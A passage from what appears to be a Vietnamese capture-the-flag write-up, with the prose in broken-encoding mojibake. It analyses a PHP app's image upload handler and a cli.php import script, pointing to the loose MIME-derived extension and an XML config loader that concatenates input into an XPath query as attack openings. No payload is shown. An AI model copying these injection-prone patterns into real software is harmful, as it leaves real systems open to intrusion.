&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="o"&gt;$&lt;/span&gt;&lt;span class="n"&gt;image&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;new&lt;/span&gt; &lt;span class="n"&gt;ImageModel&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="o"&gt;$&lt;/span&gt;&lt;span class="n"&gt;_FILES&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s2"&gt;&amp;#34;image&amp;#34;&lt;/span&gt;&lt;span class="p"&gt;]);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="k"&gt;if&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="o"&gt;$&lt;/span&gt;&lt;span class="n"&gt;image&lt;/span&gt;&lt;span class="o"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="n"&gt;isValid&lt;/span&gt;&lt;span class="p"&gt;())&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="o"&gt;$&lt;/span&gt;&lt;span class="n"&gt;mimeType&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;mime_content_type&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="o"&gt;$&lt;/span&gt;&lt;span class="n"&gt;_FILES&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s2"&gt;&amp;#34;image&amp;#34;&lt;/span&gt;&lt;span class="p"&gt;][&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;tmp_name&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;]);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="o"&gt;$&lt;/span&gt;&lt;span class="n"&gt;extention&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;explode&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;/&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="o"&gt;$&lt;/span&gt;&lt;span class="n"&gt;mimeType&lt;/span&gt;&lt;span class="p"&gt;)[&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;];&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="o"&gt;$&lt;/span&gt;&lt;span class="n"&gt;randomName&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;bin2hex&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;random_bytes&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;8&lt;/span&gt;&lt;span class="p"&gt;));&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="o"&gt;$&lt;/span&gt;&lt;span class="n"&gt;secureFilename&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;&amp;#34;$randomName.$extention&amp;#34;&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="k"&gt;if&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;move_uploaded_file&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="o"&gt;$&lt;/span&gt;&lt;span class="n"&gt;_FILES&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s2"&gt;&amp;#34;image&amp;#34;&lt;/span&gt;&lt;span class="p"&gt;][&lt;/span&gt;&lt;span class="s2"&gt;&amp;#34;tmp_name&amp;#34;&lt;/span&gt;&lt;span class="p"&gt;],&lt;/span&gt; &lt;span class="s2"&gt;&amp;#34;uploads/$secureFilename&amp;#34;&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="o"&gt;$&lt;/span&gt;&lt;span class="n"&gt;this&lt;/span&gt;&lt;span class="o"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="n"&gt;product&lt;/span&gt;&lt;span class="o"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="n"&gt;insert&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="o"&gt;$&lt;/span&gt;&lt;span class="n"&gt;title&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="o"&gt;$&lt;/span&gt;&lt;span class="n"&gt;description&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;#34;uploads/$secureFilename&amp;#34;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="n"&gt;header&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;Location: /addProduct?error=0&amp;amp;message=Product added successfully.&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="n"&gt;exit&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="p"&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="p"&gt;}&lt;/span&gt; &lt;span class="k"&gt;else&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="n"&gt;header&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;Location: /addProduct?error=1&amp;amp;message=Not a valid image.&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="n"&gt;exit&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="p"&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;ul&gt;
&lt;li&gt;Náº¿u cÃ³ dáº¥u hiá»‡u upload file, webserver Ä‘Æ°a nÃ³ vÃ o class ImageModel Ä‘á»ƒ sá»­ dá»¥ng hÃ m isValid Ä‘á»ƒ check, náº¿u nhÆ° return true thÃ¬ láº¥y extension file báº±ng cÃ¡ch bá»• Ä‘Ã´i cÃ¡i mime type mÃ  láº¥y cÃ¡i thá»© 2 -&amp;gt; Ä‘oáº¡n nÃ y khÃ¡ lá»ng láº»o vÃ¬ giÃ¡ trá»‹ Ä‘Ã³ mÃ¬nh control Ä‘Æ°á»£c nhÆ°ng Ä‘áº±ng trÆ°á»›c lÃ  whitelist nÃªn Ä‘Ã nh chá»‹u&lt;/li&gt;
&lt;li&gt;Gáº¯n file extension vá»«a láº¥y Ä‘Æ°á»£c vá»›i 16 kÃ½ tá»± random Ä‘Æ°á»£c gen báº±ng &lt;code&gt;bin2hex(random_bytes(8))&lt;/code&gt;, move vÃ o thÆ° má»¥c uploads vÃ  tráº£ vá» thÃ´ng bÃ¡o vÃ  lá»—i náº¿u cÃ³.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;RiÃªng Ä‘oáº¡n code check valid táº¡i class ImageModel Ä‘Ã£ lÃ m cho mÃ¬nh khÃ´ng tin tÆ°á»Ÿng vÃ o viá»‡c cÃ³ thá»ƒ bypass upload file PHP ná»¯a, máº·c dÃ¹ Ä‘oáº¡n láº¥y extension á»Ÿ controller khÃ¡ ngon nhÆ°ng hÃ m valid láº¡i quÃ¡ cháº·t nÃªn mÃ¬nh Ä‘i Ä‘á»c nhá»¯ng file khÃ¡c vÃ¬ cÃ²n ráº¥t nhiá»u thá»© chÆ°a Ä‘Æ°á»£c sá»­ dá»¥ng.
ÄÃ¡ng chÃº Ã½ nháº¥t cháº¯c cháº¯n lÃ  file cli/cli.php, nÃ³ vá»‘n Ä‘Æ°á»£c dÃ¹ng Ä‘á»ƒ import file sql chá»©a cÃ¡c sáº£n pháº©m máº·c Ä‘á»‹nh vÃ o database báº±ng command line, sau Ä‘Ã³ file sql sáº½ bá»‹ xÃ³a:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt;1
&lt;/span&gt;&lt;span class="lnt"&gt;2
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-fallback" data-lang="fallback"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;php /www/cli/cli.php -c /www/cli/conf.xml -m import -f /www/products.sql
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;rm /www/products.sql
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;VÃ¬ pha import nÃ y quÃ¡ cá»“ng ká»nh, cháº£ cÃ³ lÃ­ do gÃ¬ pháº£i lÃ m háº³n 1 file php chá»‰ Ä‘á»ƒ import 1 file sql vÃ o, nÃªn mÃ¬nh cháº¯c cháº¯n sáº½ khai thÃ¡c tá»« file nÃ y ra:
Ngay tá»« Ä‘áº§u file Ä‘Ã£ Ä‘Ã¡nh phá»§ Ä‘áº§u báº±ng viá»‡c check xem file cÃ³ Ä‘Æ°á»£c thá»±c thi thÃ´ng qua dÃ²ng lá»‡nh hay khÃ´ng:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt;1
&lt;/span&gt;&lt;span class="lnt"&gt;2
&lt;/span&gt;&lt;span class="lnt"&gt;3
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-fallback" data-lang="fallback"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;if (!isset( $_SERVER[&amp;#39;argv&amp;#39;], $_SERVER[&amp;#39;argc&amp;#39;] ) || !$_SERVER[&amp;#39;argc&amp;#39;]) {
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; die(&amp;#34;This script must be run from the command line!&amp;#34;);
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;}
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;&lt;code&gt;argv&lt;/code&gt; vÃ  &lt;code&gt;argc&lt;/code&gt; lÃ  2 biáº¿n siÃªu toÃ n cá»¥c, trong Ä‘Ã³ &lt;code&gt;argv&lt;/code&gt; sáº½ lÃ  má»™t máº£ng lÆ°u giÃ¡ trá»‹ cá»§a cÃ¡c tham sá»‘ truyá»n Ä‘Æ°á»£c truyá»n vÃ o file php dÆ°á»›i dáº¡ng máº£ng &lt;code&gt;[sá»‘ thá»© tá»±] =&amp;gt; value&lt;/code&gt;. CÃ²n &lt;code&gt;argc&lt;/code&gt; sáº½ chá»©a sá»‘ cÃ¡c tham sá»‘ Ä‘Æ°á»£c truyá»n vÃ o.
VÃ­ dá»¥ nhÆ° vá»›i cÃ¢u lá»‡nh cháº¡y file cli.php nhÆ° á»Ÿ trÃªn, thÃ¬ giÃ¡ trá»‹ cá»§a &lt;code&gt;argv&lt;/code&gt; sáº½ cÃ³ dáº¡ng nhÆ° sau:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt;1
&lt;/span&gt;&lt;span class="lnt"&gt;2
&lt;/span&gt;&lt;span class="lnt"&gt;3
&lt;/span&gt;&lt;span class="lnt"&gt;4
&lt;/span&gt;&lt;span class="lnt"&gt;5
&lt;/span&gt;&lt;span class="lnt"&gt;6
&lt;/span&gt;&lt;span class="lnt"&gt;7
&lt;/span&gt;&lt;span class="lnt"&gt;8
&lt;/span&gt;&lt;span class="lnt"&gt;9
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-fallback" data-lang="fallback"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;Array
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;(
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; [0] =&amp;gt; -c
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; [1] =&amp;gt; /www/cli/conf.xml
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; [2] =&amp;gt; -m
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; [3] =&amp;gt; import
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; [4] =&amp;gt; -f
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; [5] =&amp;gt; /www/products.sql
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;CÃ²n &lt;code&gt;argc&lt;/code&gt; sáº½ mang giÃ¡ trá»‹ lÃ  6, á»©ng vá»›i sá»‘ tham sá»‘ truyá»n vÃ o
File cÃ³ thá»ƒ gá»“m 3 tham sá»‘ truyá»n vÃ o:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt;1
&lt;/span&gt;&lt;span class="lnt"&gt;2
&lt;/span&gt;&lt;span class="lnt"&gt;3
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-fallback" data-lang="fallback"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;-c (--config): Truyá»n vÃ o Ä‘Æ°á»ng dáº«n tuyá»‡t Ä‘á»‘i Ä‘áº¿n file config á»Ÿ Ä‘á»‹nh dáº¡ng xml
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;-m (--method): TÃªn phÆ°Æ¡ng thá»©c hÃ nh Ä‘á»™ng tÆ°Æ¡ng á»©ng, gá»“m cÃ³ import, backup vÃ  healthcheck
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;-f (--filename): Sá»­ dá»¥ng khi dÃ¹ng method import, truyá»n vÃ o tÃªn file Ä‘á»ƒ import dá»¯ liá»‡u vÃ o database
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Tham sá»‘ &lt;code&gt;-c&lt;/code&gt; khÃ¡ quan trá»ng, giÃ¡ trá»‹ nÃ y sáº½ Ä‘Æ°á»£c check xem cÃ³ pháº£i lÃ  thÆ° má»¥c hay khÃ´ng, náº¿u cÃ³ sáº½ chÃ¨n thÃªm &lt;code&gt;config.xml&lt;/code&gt; trÆ°á»›c rá»“i return Ä‘á»‡ quy Ä‘á»ƒ tiáº¿p tá»¥c kiá»ƒm tra, tiáº¿p Ä‘Ã³ kiá»ƒm tra xem file cÃ³ tá»“n táº¡i, vÃ  file Ä‘Ã³ thÃªm &lt;code&gt;.xml&lt;/code&gt; cÃ³ tá»“n táº¡i hay khÃ´ng, náº¿u 1 trong 2 tá»“n táº¡i thÃ¬ return vá» giÃ¡ trá»‹ Ä‘Ã³.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt; 1
&lt;/span&gt;&lt;span class="lnt"&gt; 2
&lt;/span&gt;&lt;span class="lnt"&gt; 3
&lt;/span&gt;&lt;span class="lnt"&gt; 4
&lt;/span&gt;&lt;span class="lnt"&gt; 5
&lt;/span&gt;&lt;span class="lnt"&gt; 6
&lt;/span&gt;&lt;span class="lnt"&gt; 7
&lt;/span&gt;&lt;span class="lnt"&gt; 8
&lt;/span&gt;&lt;span class="lnt"&gt; 9
&lt;/span&gt;&lt;span class="lnt"&gt;10
&lt;/span&gt;&lt;span class="lnt"&gt;11
&lt;/span&gt;&lt;span class="lnt"&gt;12
&lt;/span&gt;&lt;span class="lnt"&gt;13
&lt;/span&gt;&lt;span class="lnt"&gt;14
&lt;/span&gt;&lt;span class="lnt"&gt;15
&lt;/span&gt;&lt;span class="lnt"&gt;16
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-fallback" data-lang="fallback"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;function isConfig($probableConfig) {
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; if (!$probableConfig) {
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; return null;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; }
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; if (is_dir($probableConfig)) {
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; return isConfig($probableConfig.\DIRECTORY_SEPARATOR.&amp;#39;config.xml&amp;#39;);
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; }
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; if (file_exists($probableConfig)) {
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; return $probableConfig;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; }
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; if (file_exists($probableConfig.&amp;#39;.xml&amp;#39;)) {
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; return $probableConfig.&amp;#39;.xml&amp;#39;;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; }
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; return null;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;};
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Sau khi Ä‘Ã£ xÃ¡c Ä‘á»‹nh file config cÃ³ tá»“n táº¡i, file má»›i Ä‘Æ°á»£c Ä‘Æ°a vÃ o xá»­ lÃ½:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt; 1
&lt;/span&gt;&lt;span class="lnt"&gt; 2
&lt;/span&gt;&lt;span class="lnt"&gt; 3
&lt;/span&gt;&lt;span class="lnt"&gt; 4
&lt;/span&gt;&lt;span class="lnt"&gt; 5
&lt;/span&gt;&lt;span class="lnt"&gt; 6
&lt;/span&gt;&lt;span class="lnt"&gt; 7
&lt;/span&gt;&lt;span class="lnt"&gt; 8
&lt;/span&gt;&lt;span class="lnt"&gt; 9
&lt;/span&gt;&lt;span class="lnt"&gt;10
&lt;/span&gt;&lt;span class="lnt"&gt;11
&lt;/span&gt;&lt;span class="lnt"&gt;12
&lt;/span&gt;&lt;span class="lnt"&gt;13
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-gdscript3" data-lang="gdscript3"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="n"&gt;function&lt;/span&gt; &lt;span class="n"&gt;getConfig&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="o"&gt;$&lt;/span&gt;&lt;span class="n"&gt;name&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="o"&gt;$&lt;/span&gt;&lt;span class="n"&gt;configFilename&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;isConfig&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;getCommandLineValue&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;#34;--config&amp;#34;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;#34;-c&amp;#34;&lt;/span&gt;&lt;span class="p"&gt;));&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="o"&gt;$&lt;/span&gt;&lt;span class="n"&gt;configFilename&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="o"&gt;$&lt;/span&gt;&lt;span class="n"&gt;dbConfig&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;new&lt;/span&gt; &lt;span class="n"&gt;DOMDocument&lt;/span&gt;&lt;span class="p"&gt;();&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="o"&gt;$&lt;/span&gt;&lt;span class="n"&gt;dbConfig&lt;/span&gt;&lt;span class="o"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="nb"&gt;load&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="o"&gt;$&lt;/span&gt;&lt;span class="n"&gt;configFilename&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="o"&gt;$&lt;/span&gt;&lt;span class="k"&gt;var&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;new&lt;/span&gt; &lt;span class="n"&gt;DOMXPath&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="o"&gt;$&lt;/span&gt;&lt;span class="n"&gt;dbConfig&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="n"&gt;foreach&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="o"&gt;$&lt;/span&gt;&lt;span class="k"&gt;var&lt;/span&gt;&lt;span class="o"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="n"&gt;query&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;/config/db[@name=&amp;#34;&amp;#39;&lt;/span&gt;&lt;span class="o"&gt;.$&lt;/span&gt;&lt;span class="n"&gt;name&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;&amp;#34;]&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="n"&gt;as&lt;/span&gt; &lt;span class="o"&gt;$&lt;/span&gt;&lt;span class="k"&gt;var&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="o"&gt;$&lt;/span&gt;&lt;span class="k"&gt;var&lt;/span&gt;&lt;span class="o"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="n"&gt;getAttribute&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;value&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="p"&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="n"&gt;null&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="p"&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="n"&gt;null&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;ul&gt;
&lt;li&gt;Sá»­ dá»¥ng DOMDocument() Ä‘á»ƒ load file config, sau Ä‘Ã³ query láº¥y giÃ¡ trá»‹ tá»« tháº» gá»‘c &lt;code&gt;&amp;lt;config&amp;gt;&lt;/code&gt;-&amp;gt;&lt;code&gt;&amp;lt;db&amp;gt;&lt;/code&gt;, láº¥y attribute &lt;code&gt;name&lt;/code&gt; lÆ°u vÃ o biáº¿n $vars vÃ  láº¥y attribute &lt;code&gt;value&lt;/code&gt; cá»§a name tÆ°Æ¡ng á»©ng.&lt;/li&gt;
&lt;li&gt;Ta cÅ©ng cÃ³ format cá»§a má»™t file config sáº½ nhÆ° tháº¿ nÃ o:&lt;/li&gt;
&lt;/ul&gt;
&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt;1
&lt;/span&gt;&lt;span class="lnt"&gt;2
&lt;/span&gt;&lt;span class="lnt"&gt;3
&lt;/span&gt;&lt;span class="lnt"&gt;4
